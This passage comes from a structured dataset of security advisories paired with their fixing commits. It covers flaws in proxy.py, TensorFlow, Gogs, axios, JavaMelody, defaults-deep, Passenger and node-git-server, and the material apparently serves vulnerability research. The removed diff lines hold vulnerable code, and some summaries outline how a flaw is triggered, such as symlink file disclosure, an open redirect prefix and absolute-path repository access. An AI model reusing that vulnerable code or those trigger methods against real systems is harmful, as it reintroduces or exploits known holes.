or).","published_date":"2021-04-07","chain_len":1,"project":"https:\/\/github.com\/abhinavsingh\/proxy.py","commit_href":"https:\/\/github.com\/abhinavsingh\/proxy.py\/pull\/482\/commits\/9b00093288237f5073c403f2c4f62acfdfa8ed46","commit_sha":"9b00093288237f5073c403f2c4f62acfdfa8ed46","patch":"SINGLE","chain_ord":"['9b00093288237f5073c403f2c4f62acfdfa8ed46']","before_first_fix_commit":"{'0f78e74705e295bbfccfba342bf9fd34a9aa9103'}","last_fix_commit":"9b00093288237f5073c403f2c4f62acfdfa8ed46","chain_ord_pos":1.0,"commit_datetime":"01\/10\/2021, 16:30:14","message":"Fix basic auth condition","author":"Abhinav Singh","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'proxy\/http\/proxy\/auth.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/abhinavsingh\/proxy.py\/raw\/9b00093288237f5073c403f2c4f62acfdfa8ed46\/proxy%2Fhttp%2Fproxy%2Fauth.py', 'patch': \"@@ -35,8 +35,8 @@ def before_upstream_connection(\\n                 raise ProxyAuthenticationFailed()\\n             parts = request.headers[b'proxy-authorization'][1].split()\\n             if len(parts) != 2 \\\\\\n-                    and parts[0].lower() != b'basic' \\\\\\n-                    and parts[1] != self.flags.auth_code:\\n+                    or parts[0].lower() != b'basic' \\\\\\n+                    or parts[1] != self.flags.auth_code:\\n                 raise ProxyAuthenticationFailed()\\n         return request\"}}","message_norm":"fix basic auth condition","language":"en","entities":"[('fix', 'ACTION', ''), ('auth', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['proxy\/http\/proxy\/auth.py'])","num_files":1.0},{"index":1573,"vuln_id":"GHSA-cmgw-8vpc-rc59","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8721ba96e5760c229217b594f6d2ba332beedf22'}","dataset":"osv","summary":"Segfault on strings tensors with mistmatched dimensions, due to Go code ### Impact\nUnder certain conditions, Go code can trigger a segfault in string deallocation.\n\n\nFor string tensors, `C.TF_TString_Dealloc` is called during garbage collection within a finalizer function.  However, tensor structure isn't checked until encoding to avoid a performance penalty.  The current method for dealloc assumes that encoding succeeded, but segfaults when a string tensor is garbage collected whose encoding failed (e.g., due to mismatched dimensions).\n\nTo fix this, the call to set the finalizer function is deferred until `NewTensor` returns and, if encoding failed for a string tensor, deallocs are determined based on bytes written.\n\n### Patches\nWe have patched the issue in GitHub commit [8721ba96e5760c229217b594f6d2ba332beedf22](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8721ba96e5760c229217b594f6d2ba332beedf22) (merging [#50508](https:\/\/github.com\/tensorflow\/tensorflow\/pull\/50508)).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, which is the other affected version.                                                                                                                                               \n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [fixing PR](https:\/\/github.com\/tensorflow\/tensorflow\/pull\/50508).","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8721ba96e5760c229217b594f6d2ba332beedf22","commit_sha":"8721ba96e5760c229217b594f6d2ba332beedf22","patch":"SINGLE","chain_ord":"['8721ba96e5760c229217b594f6d2ba332beedf22']","before_first_fix_commit":"{'5a14b2e21e2026b0838f892fed43c4c0e4b3c299', '49499c17794b39a2a7d5be2b477ed7d5704d0629'}","last_fix_commit":"8721ba96e5760c229217b594f6d2ba332beedf22","chain_ord_pos":1.0,"commit_datetime":"07\/13\/2021, 22:13:47","message":"Merge pull request #50508 from wamuir:fix-tstring-dealloc\n\nPiperOrigin-RevId: 384557722\nChange-Id: I72858edf72952fd4e7e0a1d9776c9408a7081d42","author":"TensorFlower Gardener","comments":null,"stats":"{'additions': 17, 'deletions': 13, 'total': 30}","files":"{'tensorflow\/go\/tensor.go': {'additions': 17, 'deletions': 13, 'changes': 30, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8721ba96e5760c229217b594f6d2ba332beedf22\/tensorflow%2Fgo%2Ftensor.go', 'patch': '@@ -98,9 +98,9 @@ func NewTensor(value interface{}) (*Tensor, error) {\\n \\n \\traw := tensorData(t.c)\\n \\n-\\truntime.SetFinalizer(t, func(t *Tensor) {\\n+\\tdefer runtime.SetFinalizer(t, func(t *Tensor) {\\n \\t\\tif dataType == String {\\n-\\t\\t\\tt.clearTStrings(raw, nflattened)\\n+\\t\\t\\tt.clearTStrings(raw, int64(nbytes\/C.sizeof_TF_TString))\\n \\t\\t}\\n \\n \\t\\tt.finalize()\\n@@ -111,15 +111,18 @@ func NewTensor(value interface{}) (*Tensor, error) {\\n \\tif isAllArray(val.Type()) {\\n \\t\\t\/\/ We have arrays all the way down, or just primitive types. We can\\n \\t\\t\/\/ just copy the memory in as it is all contiguous.\\n-\\t\\tif err := copyPtr(buf, unpackEFace(value).data, int(val.Type().Size())); err != nil {\\n+\\t\\tif _, err := copyPtr(buf, unpackEFace(value).data, int(val.Type().Size())); err != nil {\\n \\t\\t\\treturn nil, err\\n \\t\\t}\\n \\t} else {\\n \\t\\t\/\/ When there are slices involved the memory for each leaf slice may\\n \\t\\t\/\/ not be contiguous with the others or in the order we might\\n \\t\\t\/\/ expect, so we need to work our way down to each slice of\\n \\t\\t\/\/ primitives and copy them individually\\n-\\t\\tif err := encodeTensorWithSlices(buf, val, shape); err != nil {\\n+\\t\\tif n, err := encodeTensorWithSlices(buf, val, shape); err != nil {\\n+\\t\\t\\t\/\/ Set nbytes to count of bytes written for deferred call to\\n+\\t\\t\\t\/\/ runtime.SetFinalizer\\n+\\t\\t\\tnbytes = uintptr(n)\\n \\t\\t\\treturn nil, err\\n \\t\\t}\\n \\t}\\n@@ -486,13 +489,13 @@ func sizeVarUint(v uint64) int {\\n \\n \/\/ encodeTensorWithSlices writes v to the specified buffer using the format specified in\\n \/\/ c_api.h. Use stringEncoder for String tensors.\\n-func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) error {\\n+func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) (int, error) {\\n \\t\/\/ If current dimension is a slice, verify that it has the expected size\\n \\t\/\/ Go\\'s type system makes that guarantee for arrays.\\n \\tif v.Kind() == reflect.Slice {\\n \\t\\texpected := int(shape[0])\\n \\t\\tif v.Len() != expected {\\n-\\t\\t\\treturn fmt.Errorf(\"mismatched slice lengths: %d and %d\", v.Len(), expected)\\n+\\t\\t\\treturn 0, fmt.Errorf(\"mismatched slice lengths: %d and %d\", v.Len(), expected)\\n \\t\\t}\\n \\t} else if v.Kind() == reflect.String {\\n \\t\\ts := v.Interface().(string)\\n@@ -501,7 +504,7 @@ func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) err\\n \\t\\tptr := unsafe.Pointer(&tstr)\\n \\t\\treturn copyPtr(w, ptr, C.sizeof_TF_TString)\\n \\t} else if v.Kind() != reflect.Array {\\n-\\t\\treturn fmt.Errorf(\"unsupported type %v\", v.Type())\\n+\\t\\treturn 0, fmt.Errorf(\"unsupported type %v\", v.Type())\\n \\t}\\n \\n \\t\/\/ Once we have just a single dimension we can just copy the data\\n@@ -514,15 +517,17 @@ func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) err\\n \\t\\treturn copyPtr(w, ptr, v.Len()*int(elt.Type().Size()))\\n \\t}\\n \\n+\\tn := 0\\n \\tsubShape := shape[1:]\\n \\tfor i := 0; i < v.Len(); i++ {\\n-\\t\\terr := encodeTensorWithSlices(w, v.Index(i), subShape)\\n+\\t\\tj, err := encodeTensorWithSlices(w, v.Index(i), subShape)\\n \\t\\tif err != nil {\\n-\\t\\t\\treturn err\\n+\\t\\t\\treturn n + j, err\\n \\t\\t}\\n+\\t\\tn += j\\n \\t}\\n \\n-\\treturn nil\\n+\\treturn n, nil\\n }\\n \\n \/\/ It isn\\'t safe to use reflect.SliceHeader as it uses a uintptr for Data and\\n@@ -536,15 +541,14 @@ type sliceHeader struct {\\n \/\/ copyPtr copies the backing data for a slice or array directly into w. Note\\n \/\/ we don\\'t need to worry about byte ordering because we want the natural byte\\n \/\/ order for the machine we\\'re running on.\\n-func copyPtr(w *bytes.Buffer, ptr unsafe.Pointer, l int) error {\\n+func copyPtr(w *bytes.Buffer, ptr unsafe.Pointer, l int) (int, error) {\\n \\t\/\/ Convert our slice header into a []byte so we can call w.Write\\n \\tb := *(*[]byte)(unsafe.Pointer(&sliceHeader{\\n \\t\\tData: ptr,\\n \\t\\tLen:  l,\\n \\t\\tCap:  l,\\n \\t}))\\n-\\t_, err := w.Write(b)\\n-\\treturn err\\n+\\treturn w.Write(b)\\n }\\n \\n func bug(format string, args ...interface{}) error {'}}","message_norm":"merge pull request #50508 from wamuir:fix-tstring-dealloc\n\npiperorigin-revid: 384557722\nchange-id: i72858edf72952fd4e7e0a1d9776c9408a7081d42","language":"en","entities":"[('#50508', 'ISSUE', ''), ('384557722', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/go\/tensor.go'])","num_files":1.0},{"index":1578,"vuln_id":"GHSA-cpgw-2wxr-pww3","cwe_id":"{'CWE-601'}","score":6.1,"chain":"{'https:\/\/github.com\/gogs\/gogs\/commit\/1f247cf8139cb483276cd8dd06385a800ce9d4b2'}","dataset":"osv","summary":"Open Redirect Open redirect vulnerability in Gogs before 0.12 allows remote attackers to redirect users to arbitrary websites and conduct phishing attacks via an initial \/\\ substring in the user\/login redirect_to parameter, related to the function isValidRedirect in routes\/user\/auth.go.","published_date":"2021-06-29","chain_len":1,"project":"https:\/\/github.com\/gogs\/gogs","commit_href":"https:\/\/github.com\/gogs\/gogs\/commit\/1f247cf8139cb483276cd8dd06385a800ce9d4b2","commit_sha":"1f247cf8139cb483276cd8dd06385a800ce9d4b2","patch":"SINGLE","chain_ord":"['1f247cf8139cb483276cd8dd06385a800ce9d4b2']","before_first_fix_commit":"{'c9bb33afc3ae35db21b26fd914bd80ca277a4e0d'}","last_fix_commit":"1f247cf8139cb483276cd8dd06385a800ce9d4b2","chain_ord_pos":1.0,"commit_datetime":"08\/06\/2018, 09:10:16","message":"routes: fix open redirect vulnerability #5364 (#5365)","author":"chromium1337","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'routes\/user\/auth.go': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gogs\/gogs\/raw\/1f247cf8139cb483276cd8dd06385a800ce9d4b2\/routes%2Fuser%2Fauth.go', 'patch': \"@@ -73,10 +73,10 @@ func AutoLogin(c *context.Context) (bool, error) {\\n }\\n \\n \/\/ isValidRedirect returns false if the URL does not redirect to same site.\\n-\/\/ False: \/\/url, http:\/\/url\\n+\/\/ False: \/\/url, http:\/\/url, \/\\\\url\\n \/\/ True: \/url\\n func isValidRedirect(url string) bool {\\n-\\treturn len(url) >= 2 && url[0] == '\/' && url[1] != '\/'\\n+\\treturn len(url) >= 2 && url[0] == '\/' && url[1] != '\/' && url[1] != '\\\\\\\\'\\n }\\n \\n func Login(c *context.Context) {\"}}","message_norm":"routes: fix open redirect vulnerability #5364 (#5365)","language":"en","entities":"[('fix', 'ACTION', ''), ('open redirect', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('#5364', 'ISSUE', ''), ('#5365', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['routes\/user\/auth.go'])","num_files":1.0},{"index":1579,"vuln_id":"GHSA-cph5-m8f7-6c5x","cwe_id":"{'CWE-697', 'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/axios\/axios\/commit\/5b457116e31db0e88fede6c428e969e87f290929'}","dataset":"osv","summary":"Incorrect Comparison in axios axios is vulnerable to Inefficient Regular Expression Complexity","published_date":"2021-09-01","chain_len":1,"project":"https:\/\/github.com\/axios\/axios","commit_href":"https:\/\/github.com\/axios\/axios\/commit\/5b457116e31db0e88fede6c428e969e87f290929","commit_sha":"5b457116e31db0e88fede6c428e969e87f290929","patch":"SINGLE","chain_ord":"['5b457116e31db0e88fede6c428e969e87f290929']","before_first_fix_commit":"{'5bc9ea24dda14e74def0b8ae9cdb3fa1a0c77773'}","last_fix_commit":"5b457116e31db0e88fede6c428e969e87f290929","chain_ord_pos":1.0,"commit_datetime":"08\/30\/2021, 12:33:43","message":"Security fix for ReDoS (#3980)","author":"ready-research","comments":"{'com_1': {'author': 'kanatBektursyn', 'datetime': '09\/02\/2021, 07:27:22', 'body': 'What is the usage of self made trim function?'}, 'com_2': {'author': 'muditjuneja', 'datetime': '09\/03\/2021, 13:40:44', 'body': 'Something related to this : https:\/\/app.snyk.io\/vuln\/SNYK-JS-AXIOS-1579269?'}, 'com_3': {'author': 'vargaurav', 'datetime': '09\/05\/2021, 05:56:14', 'body': 'This is getting flagged in snyk.'}, 'com_4': {'author': 'tbogard', 'datetime': '09\/06\/2021, 01:01:48', 'body': '> What is the usage of self made trim function?\\r\\n\\r\\nProbably an intended custom made trim function with the intention to be faster... but ended in bloating resources...'}, 'com_5': {'author': 'catscarlet', 'datetime': '09\/08\/2021, 03:25:02', 'body': 'But, but `str.trim()` should not only deal with \\\\s but also deal with \\\\uFEFF and \\\\xA0. \\r\\n\\r\\nThe trim Polyfill was:\\r\\n\\r\\n```\\r\\nif (!String.prototype.trim) {\\r\\n  String.prototype.trim = function () {\\r\\n    return this.replace(\/^[\\\\s\\\\uFEFF\\\\xA0]+|[\\\\s\\\\uFEFF\\\\xA0]+$\/g, \\'\\');\\r\\n  };\\r\\n}\\r\\n```\\r\\n\\r\\nMDN(en) removed this part because of \"outdated with WebView Android 37\".\\r\\nThe other languages still have this Polyfill part.\\r\\n\\r\\nSee mdn\/content#7602'}, 'com_6': {'author': 'Teej42', 'datetime': '09\/09\/2021, 17:15:48', 'body': 'It is not clear to me, but was this fix added in v0.21.4 release, or will be added in the next release?'}, 'com_7': {'author': 'jasonsaayman', 'datetime': '09\/09\/2021, 17:57:06', 'body': \"Already added :) I think the custom trim function was used like this incase a browser or version of node did not have native support. I don't think we can drop it just yet due to supporting a pretty large range of browsers. However I will review some of that code when I have a chance and see if it would be possible to get rid of it.\"}}","stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/utils.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/axios\/axios\/raw\/5b457116e31db0e88fede6c428e969e87f290929\/lib%2Futils.js', 'patch': \"@@ -185,7 +185,7 @@ function isURLSearchParams(val) {\\n  * @returns {String} The String freed of excess whitespace\\n  *\/\\n function trim(str) {\\n-  return str.replace(\/^\\\\s*\/, '').replace(\/\\\\s*$\/, '');\\n+  return str.trim ? str.trim() : str.replace(\/^\\\\s+|\\\\s+$\/g, '');\\n }\\n \\n \/**\"}}","message_norm":"security fix for redos (#3980)","language":"en","entities":"[('security', 'SECWORD', ''), ('redos', 'SECWORD', ''), ('#3980', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/utils.js'])","num_files":1.0},{"index":1589,"vuln_id":"GHSA-cqhr-jqvc-qw9p","cwe_id":"{'CWE-79'}","score":10.0,"chain":"{'https:\/\/github.com\/javamelody\/javamelody\/commit\/e0497c1980acebd257d3da78dfde29ae9bdffdf6'}","dataset":"osv","summary":"Java Melody vulnerable to cross-site scripting JavaMelody is a monitoring tool for JavaEE applications. Versions prior to 1.61.0 are vulnerable to a cross-site scripting (XSS) attack. This issue was patched in version 1.61.0, and users are recommended to upgrade to the latest version. There are no known workarounds.","published_date":"2022-07-20","chain_len":1,"project":"https:\/\/github.com\/javamelody\/javamelody","commit_href":"https:\/\/github.com\/javamelody\/javamelody\/commit\/e0497c1980acebd257d3da78dfde29ae9bdffdf6","commit_sha":"e0497c1980acebd257d3da78dfde29ae9bdffdf6","patch":"SINGLE","chain_ord":"['e0497c1980acebd257d3da78dfde29ae9bdffdf6']","before_first_fix_commit":"{'7f9460e61bc2d942af3fee19041deda6c8f85816'}","last_fix_commit":"e0497c1980acebd257d3da78dfde29ae9bdffdf6","chain_ord_pos":1.0,"commit_datetime":"08\/24\/2016, 15:15:22","message":"fix XSS","author":"evernat","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'javamelody-core\/src\/main\/java\/net\/bull\/javamelody\/HtmlCoreReport.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/javamelody\/javamelody\/raw\/e0497c1980acebd257d3da78dfde29ae9bdffdf6\/javamelody-core%2Fsrc%2Fmain%2Fjava%2Fnet%2Fbull%2Fjavamelody%2FHtmlCoreReport.java', 'patch': '@@ -365,7 +365,7 @@ void writeMessageIfNotNull(String message, String partToRedirectTo,\\n \\t\\tif (message != null) {\\r\\n \\t\\t\\twriteln(SCRIPT_BEGIN);\\r\\n \\t\\t\\t\/\/ writeDirectly pour ne pas g\u00e9rer de traductions si le message contient \\'#\\'\\r\\n-\\t\\t\\twriteDirectly(\"alert(\\\\\"\" + javascriptEncode(message) + \"\\\\\");\");\\r\\n+\\t\\t\\twriteDirectly(\"alert(\\\\\"\" + htmlEncodeButNotSpace(javascriptEncode(message)) + \"\\\\\");\");\\r\\n \\t\\t\\twriteln(\"\");\\r\\n \\t\\t\\t\/\/ redirect vers une url \u00e9vitant que F5 du navigateur ne refasse l\\'action au lieu de faire un refresh\\r\\n \\t\\t\\tif (partToRedirectTo == null) {'}}","message_norm":"fix xss","language":"ca","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['javamelody-core\/src\/main\/java\/net\/bull\/javamelody\/HtmlCoreReport.java'])","num_files":1.0},{"index":1591,"vuln_id":"GHSA-cqp5-m4pq-gfgp","cwe_id":"{'CWE-471'}","score":0.0,"chain":"{'https:\/\/github.com\/jonschlinkert\/defaults-deep\/commit\/c873f341327ad885ff4d0f23b3d3bca31b0343e5'}","dataset":"osv","summary":"Prototype Pollution in defaults-deep Versions of `default-deep` before 0.2.4 are vulnerable to prototype pollution\n\n\n## Recommendation\n\nUpdate to version 0.2.4 or later.","published_date":"2018-07-26","chain_len":1,"project":"https:\/\/github.com\/jonschlinkert\/defaults-deep","commit_href":"https:\/\/github.com\/jonschlinkert\/defaults-deep\/commit\/c873f341327ad885ff4d0f23b3d3bca31b0343e5","commit_sha":"c873f341327ad885ff4d0f23b3d3bca31b0343e5","patch":"SINGLE","chain_ord":"['c873f341327ad885ff4d0f23b3d3bca31b0343e5']","before_first_fix_commit":"{'aef804bf3e56484a6e463e35f5f74599523aee69'}","last_fix_commit":"c873f341327ad885ff4d0f23b3d3bca31b0343e5","chain_ord_pos":1.0,"commit_datetime":"02\/07\/2018, 16:52:35","message":"exclude __proto__","author":"doowb","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'index.js': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jonschlinkert\/defaults-deep\/raw\/c873f341327ad885ff4d0f23b3d3bca31b0343e5\/index.js', 'patch': \"@@ -16,6 +16,10 @@ function defaultsDeep(target, objects) {\\n \\n   function copy(target, current) {\\n     lazy.forOwn(current, function (value, key) {\\n+      if (key === '__proto__') {\\n+        return;\\n+      }\\n+\\n       var val = target[key];\\n       \/\/ add the missing property, or allow a null property to be updated\\n       if (val == null) {\"}}","message_norm":"exclude __proto__","language":"pt","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1599,"vuln_id":"GHSA-crch-j389-5f84","cwe_id":"{'CWE-787'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c59c37e7b2d563967da813fa50fe20b21f4da683'}","dataset":"osv","summary":"Heap OOB write in TFLite ### Impact\nA specially crafted TFLite model could trigger an OOB write on heap in the TFLite implementation of [`ArgMin`\/`ArgMax`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/102b211d892f3abc14f845a72047809b39cc65ab\/tensorflow\/lite\/kernels\/arg_min_max.cc#L52-L59):\n\n```cc\nTfLiteIntArray* output_dims = TfLiteIntArrayCreate(NumDimensions(input) - 1);\nint j = 0;\nfor (int i = 0; i < NumDimensions(input); ++i) { \n  if (i != axis_value) {\n    output_dims->data[j] = SizeOfDimension(input, i);\n    ++j;\n  }\n}\n```\n\nIf `axis_value` is not a value between 0 and `NumDimensions(input)`, then the condition in the `if` is never true, so code writes past the last valid element of `output_dims->data`.\n  \n### Patches \nWe have patched the issue in GitHub commit [c59c37e7b2d563967da813fa50fe20b21f4da683](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c59c37e7b2d563967da813fa50fe20b21f4da683).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/c59c37e7b2d563967da813fa50fe20b21f4da683","commit_sha":"c59c37e7b2d563967da813fa50fe20b21f4da683","patch":"SINGLE","chain_ord":"['c59c37e7b2d563967da813fa50fe20b21f4da683']","before_first_fix_commit":"{'102b211d892f3abc14f845a72047809b39cc65ab'}","last_fix_commit":"c59c37e7b2d563967da813fa50fe20b21f4da683","chain_ord_pos":1.0,"commit_datetime":"04\/29\/2021, 00:50:10","message":"Prevent array write out-of-bounds.\n\nIf user passes an invalid axis, then we copy one too many dimensions to the output in the loop below these checks. Even if we didn't do that, there will be further issues with an invalid axis, so we check for that right now.\n\nPiperOrigin-RevId: 371023299\nChange-Id: I9eca37ffc2b29e8e48710f500701270ef0790224","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/lite\/kernels\/arg_min_max.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/c59c37e7b2d563967da813fa50fe20b21f4da683\/tensorflow%2Flite%2Fkernels%2Farg_min_max.cc', 'patch': '@@ -48,6 +48,9 @@ TfLiteStatus ResizeOutput(TfLiteContext* context, const TfLiteTensor* input,\\n     axis_value += NumDimensions(input);\\n   }\\n \\n+  TF_LITE_ENSURE(context, axis_value >= 0);\\n+  TF_LITE_ENSURE(context, axis_value < NumDimensions(input));\\n+\\n   \/\/ Copy the input dimensions to output except the axis dimension.\\n   TfLiteIntArray* output_dims = TfLiteIntArrayCreate(NumDimensions(input) - 1);\\n   int j = 0;'}}","message_norm":"prevent array write out-of-bounds.\n\nif user passes an invalid axis, then we copy one too many dimensions to the output in the loop below these checks. even if we didn't do that, there will be further issues with an invalid axis, so we check for that right now.\n\npiperorigin-revid: 371023299\nchange-id: i9eca37ffc2b29e8e48710f500701270ef0790224","language":"en","entities":"[('prevent', 'ACTION', ''), ('out-of-bounds', 'SECWORD', ''), ('issues', 'FLAW', ''), ('371023299', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/arg_min_max.cc'])","num_files":1.0},{"index":1607,"vuln_id":"GHSA-cv3f-px9r-54hm","cwe_id":"{'CWE-200'}","score":4.7,"chain":"{'https:\/\/github.com\/phusion\/passenger\/commit\/4043718264095cde6623c2cbe8c644541036d7bf'}","dataset":"osv","summary":"Phusion Passenger information disclosure In agent\/Core\/SpawningKit\/Spawner.h in Phusion Passenger 5.1.10 (fixed in Passenger Open Source 5.1.11 and Passenger Enterprise 5.1.10), if Passenger is running as root, it is possible to list the contents of arbitrary files on a system by symlinking a file named REVISION from the application root folder to a file of choice and querying passenger-status --show=xml.","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/phusion\/passenger","commit_href":"https:\/\/github.com\/phusion\/passenger\/commit\/4043718264095cde6623c2cbe8c644541036d7bf","commit_sha":"4043718264095cde6623c2cbe8c644541036d7bf","patch":"SINGLE","chain_ord":"['4043718264095cde6623c2cbe8c644541036d7bf']","before_first_fix_commit":"{'a63f1e9cd8148dfaac08b00d74ef2b59bc2c9dd4'}","last_fix_commit":"4043718264095cde6623c2cbe8c644541036d7bf","chain_ord_pos":1.0,"commit_datetime":"10\/11\/2017, 13:55:07","message":"Disable unused feature.","author":"Daniel Knoppel (Phusion)","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'src\/agent\/Core\/SpawningKit\/Spawner.h': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/phusion\/passenger\/raw\/4043718264095cde6623c2cbe8c644541036d7bf\/src%2Fagent%2FCore%2FSpawningKit%2FSpawner.h', 'patch': '@@ -721,7 +721,6 @@ class Spawner {\\n \\t\\tprepareChroot(info, options);\\n \\t\\tinfo.userSwitching = prepareUserSwitching(options);\\n \\t\\tprepareSwitchingWorkingDirectory(info, options);\\n-\\t\\tinferApplicationInfo(info);\\n \\t\\treturn info;\\n \\t}\\n \\n@@ -775,6 +774,7 @@ class Spawner {\\n \\t\\tassert(info.appRootPathsInsideChroot.back() == info.appRootInsideChroot);\\n \\t}\\n \\n+#ifdef false\\n \\tvoid inferApplicationInfo(SpawnPreparationInfo &info) const {\\n \\t\\tinfo.codeRevision = readFromRevisionFile(info);\\n \\t\\tif (info.codeRevision.empty()) {\\n@@ -817,6 +817,7 @@ class Spawner {\\n \\t\\t\\treturn string();\\n \\t\\t}\\n \\t}\\n+#endif\\n \\n \\tbool shouldLoadShellEnvvars(const Options &options, const SpawnPreparationInfo &preparation) const {\\n \\t\\tif (options.loadShellEnvvars) {'}}","message_norm":"disable unused feature.","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/agent\/Core\/SpawningKit\/Spawner.h'])","num_files":1.0},{"index":1608,"vuln_id":"GHSA-cv3v-7846-6pxm","cwe_id":"{'CWE-552'}","score":7.5,"chain":"{'https:\/\/github.com\/gabrielcsapo\/node-git-server\/commit\/ac26650f69bc445d71e4f2c55328676d10a4be43'}","dataset":"osv","summary":"Unauthorized File Access in node-git-server Versions of `node-git-server` prior to 0.6.1 are vulnerable to Unauthorized File Access. It is possible to access any git repository by using absolute paths, which may allow attackers to access private repositories.\n\n\n## Recommendation\n\nUpgrade to version 0.6.1 or later.","published_date":"2020-09-03","chain_len":1,"project":"https:\/\/github.com\/gabrielcsapo\/node-git-server","commit_href":"https:\/\/github.com\/gabrielcsapo\/node-git-server\/commit\/ac26650f69bc445d71e4f2c55328676d10a4be43","commit_sha":"ac26650f69bc445d71e4f2c55328676d10a4be43","patch":"SINGLE","chain_ord":"['ac26650f69bc445d71e4f2c55328676d10a4be43']","before_first_fix_commit":"{'e3ae3737fc9de848856e56a3cf624fe014803f25'}","last_fix_commit":"ac26650f69bc445d71e4f2c55328676d10a4be43","chain_ord_pos":1.0,"commit_datetime":"03\/29\/2020, 17:45:58","message":"Security Issue (#62)\n\nIt is currently possible to overwrite the `repoDir` by sending a repository name that starts with a \"\/\", the `path.resolve` method prioritizes the second argument see the example below.\r\n\r\npath.resolve(\"\/my\/repo\/folder\",\"\/etc\"); \/\/ \/etc\r\n\r\nThis behavior gives an attacker the ability to create\/write\/pull repositories from an arbitrary absolute path, this issue could also impact authentication in some cases as it corrupts the repository name.","author":"Ron Masas","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/git.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gabrielcsapo\/node-git-server\/raw\/ac26650f69bc445d71e4f2c55328676d10a4be43\/lib%2Fgit.js', 'patch': '@@ -143,7 +143,7 @@ class Git extends EventEmitter {\\n         this.dirMap = repoDir;\\n     } else {\\n         this.dirMap = (dir) => {\\n-            return (path.normalize(dir ? path.resolve(repoDir, dir) : repoDir));\\n+            return (path.normalize(dir ? path.join(repoDir, dir) : repoDir));\\n         };\\n     }'}}","message_norm":"security issue (#62)\n\nit is currently possible to overwrite the `repodir` by sending a repository name that starts with a \"\/\", the `path.resolve` method prioritizes the second argument see the example below.\r\n\r\npath.resolve(\"\/my\/repo\/folder\",\"\/etc\"); \/\/ \/etc\r\n\r\nthis behavior gives an attacker the ability to create\/write\/pull repositories from an arbitrary absolute path, this issue could also impact authentication in some cases as it corrupts the repository name.","language":"en","entities":"[('security', 'SECWORD', ''), ('issue', 'FLAW', ''), ('#62', 'ISSUE', ''), ('attacker', 'FLAW', ''), ('issue', 'FLAW', ''), ('authentication', 'SECWORD', 